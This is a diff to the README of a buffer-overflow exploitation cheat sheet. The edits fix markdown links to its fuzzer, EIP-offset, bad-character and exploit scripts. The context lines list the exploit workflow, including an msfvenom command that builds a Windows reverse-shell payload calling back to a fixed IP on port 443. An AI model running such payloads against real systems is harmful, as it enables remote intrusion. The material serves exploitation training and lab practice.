@@ -3,14 +3,15 @@
 1. Connecting to vulnerable app
 ```nc <ip> <port> ```
 2. Fuzzing
-([Fuzzer.py]https://github.com/EdElbakyan/BOF-Cheat-Sheet/blob/main/BOF/fuzzer.py))
+([Fuzzer.py](https://github.com/EdElbakyan/BOF-Cheat-Sheet/blob/main/BOF/fuzzer.py))
 
 3. Finding EIP
+([finding_eip.py](https://github.com/EdElbakyan/BOF-Cheat-Sheet/blob/main/BOF/finding-eip.py))
 ```
 msf-pattern_create -l $length
 msf-pattern_offset -q $EIP
 ``` 
-([finding_eip.py](https://github.com/EdElbakyan/BOF-Cheat-Sheet/blob/main/BOF/finding-eip.py))
+
 
 4. Determining bad chars
 ([bad_chars.py](https://github.com/EdElbakyan/BOF-Cheat-Sheet/blob/main/BOF/bad_chars.py))
@@ -30,4 +31,4 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.9.238.148 LPORT=443 EXITFUNC=thre
 
 ```
 7. Exploiting
-([exploit.py]https://github.com/EdElbakyan/BOF-Cheat-Sheet/blob/main/BOF/exploit.py.py))
+([exploit.py](https://github.com/EdElbakyan/BOF-Cheat-Sheet/blob/main/BOF/exploit.py.py))
